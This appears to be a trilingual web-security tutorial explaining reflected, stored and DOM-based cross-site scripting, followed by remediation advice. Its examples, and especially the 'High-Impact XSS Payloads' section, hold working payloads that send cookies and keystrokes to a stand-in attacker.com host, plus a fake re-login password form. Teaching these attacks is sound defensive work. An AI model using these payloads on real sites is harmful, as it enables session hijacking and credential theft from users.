## 1. 🏢 Overview — What is Cross-Site Scripting?

### 🇮🇩 Bahasa Indonesia
**Cross-Site Scripting (XSS)** adalah kerentanan keamanan web di mana penyerang menyuntikkan skrip berbahaya (biasanya JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain. Skrip tersebut dieksekusi di dalam browser korban dalam konteks hak akses (*origin*) situs yang sah, melanggar **Same-Origin Policy (SOP)**.

### 🇬🇧 English
**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability wherein an adversary injects malicious scripts (predominantly JavaScript) into trusted web applications viewed by unsuspecting users. The script executes within the victim's browser context under the target application's origin, bypassing the browser's **Same-Origin Policy (SOP)**.

### 🇯🇵 日本語
**クロスサイトスクリプティング（XSS）**は、悪意のあるスクリプト（主にJavaScript）が正規のWebサイトに挿入され、他のユーザーのブラウザ上で実行されるクライアントサイドの脆弱性です。スクリプトは信頼されたドメインの権限（同一オリジンポリシーのコンテキスト）で動作します。

## 2. 🪞 Reflected (Non-Persistent) XSS

Input yang dikirimkan oleh user (biasanya melalui parameter URL query string atau form submission) langsung dipantulkan (*reflected*) kembali ke dalam respons HTTP tanpa validasi atau encoding yang tepat.

```
Attacker crafts malicious link:
http://target.com/search.php?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

1. Attacker sends link to victim via Phishing/Chat.
2. Victim clicks link -> Request sent to target.com.
3. target.com reflects <script> in the search result page.
4. Victim's browser executes JavaScript -> Cookie sent to attacker!
```

---

## 3. 💾 Stored (Persistent) XSS

Skrip jahat yang disuntikkan disimpan secara permanen di database server (misalnya pada kolom komentar blog, pesan forum, profil pengguna, atau tiket bantuan admin). Setiap kali ada pengguna atau admin yang membuka halaman tersebut, skrip otomatis dieksekusi di browser mereka.

```html
<!-- Malicious payload stored in comment body -->
<img src="x" onerror="var img=new Image();img.src='http://attacker.com/log?cookie='+encodeURIComponent(document.cookie);">
```

## 4. 🌐 DOM-Based XSS

Kerentanan terjadi sepenuhnya di sisi klien (*client-side*). JavaScript frontend membaca data dari **Source** yang tidak aman dan mengeksekusinya ke dalam **Sink** yang berbahaya tanpa sanitasi.

```
[ Sources (Input) ]              ───>    [ Sinks (Execution) ]
- location.search / location.hash         - element.innerHTML
- document.referrer                       - document.write()
- window.name                             - eval() / setTimeout()
- location.href                           - document.location
```

```javascript
// Vulnerable DOM Script:
let query = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = "Hello " + query; // SINK innerHTML!

// Exploit Payload:
http://target.com/index.html?name=<img src=x onerror=alert(document.domain)>
```

## 5. 💥 High-Impact XSS Payloads

```html
<!-- 1. Session Hijacking (Cookie Exfiltration) -->
<script>
fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

<!-- 2. Keystroke Logging (Keylogger) -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/k?key=' + e.key);
};
</script>

<!-- 3. Password Manager / Credential Harvester Prompt -->
<form action="http://attacker.com/creds" method="POST">
    <h3>Session Expired. Please Re-enter Password:</h3>
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

## 6. 🛡️ Remediation & Defensive Security

1. **Context-Aware Output Encoding**:
   - **HTML Body**: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`
   - **JavaScript Context**: Encode menggunakan Unicode escapes (`\u0027`, `\u0022`).
2. **HttpOnly Cookie Flag**: Mencegah JavaScript mengakses session cookie (`document.cookie` mengembalikan string kosong).
3. **Content Security Policy (CSP)**:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
   ```
